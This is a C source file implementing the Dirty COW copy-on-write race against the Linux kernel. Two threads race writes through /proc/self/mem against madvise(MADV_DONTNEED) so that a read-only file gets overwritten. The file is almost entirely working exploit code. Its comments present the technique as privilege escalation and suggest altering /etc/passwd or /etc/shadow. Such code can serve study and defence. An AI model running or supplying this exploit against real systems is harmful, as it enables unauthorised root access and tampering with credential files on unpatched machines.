#include <stdio.h> 
#include <fcntl.h> 
#include <unistd.h> 
#include <sys/stat.h> 
#include <sys/mman.h> // OUR EXPLOITABLE PROCESS
#include <pthread.h>  
#include <stdint.h> 
#include <string.h> 


void *map;
char *file_name = "EVIL_FILE";
char *to_be_written = "12345";

//Proc self mem is called and races the MADV_DONTNEED call that is performed in the next
//portion of the script.  It forces the write to push directly to the memory mapped file
//regardless of whether the file is read only or not.  This is a basic priv esc technique
//but there can be far more dangerous things performed like editing /etc/passwd, or /etc/shadow

//ptrace(2) is an alternate attack vector for this exploit as well.  These are out-of-band memory
//exploits.

void *write_to_mapping (void *arg) {
	int i;
	for (i = 0; i < 10000; i++) {
		int f = open("/proc/self/mem", O_RDWR);
		lseek(f, (uintptr_t)map, SEEK_SET);
		write(f, to_be_written, strlen(to_be_written));
	}
}

//this is racing the write and is a non-posix standard format that allows the COW.

void* drop_mapping (void *arg) {
	int i;
	for (i = 0; i < 10000; i++)
		madvise(map, 100, MADV_DONTNEED);
}


int main () {

//  This section will open a file and map it.
	int f = open("EVIL_FILE", O_RDONLY);
	struct stat file_info;
	fstat(f, &file_info);
	map = mmap(NULL, file_info.st_size, PROT_READ, MAP_PRIVATE, f, 0);


// This section will  run two threads.  MAP PRIVATE Will use copy-on-write mapping, 
//this link will show you the descriptions of the commands:
//https://man7.org/linux/man-pages/man2/madvise.2.html  

	pthread_t thread_1, thread_2;
	pthread_create(&thread_1, NULL, write_to_mapping, NULL);
	pthread_create(&thread_2, NULL, drop_mapping, NULL);
	pthread_join(thread_1, NULL);
	pthread_join(thread_2, NULL);

	return 0;
}
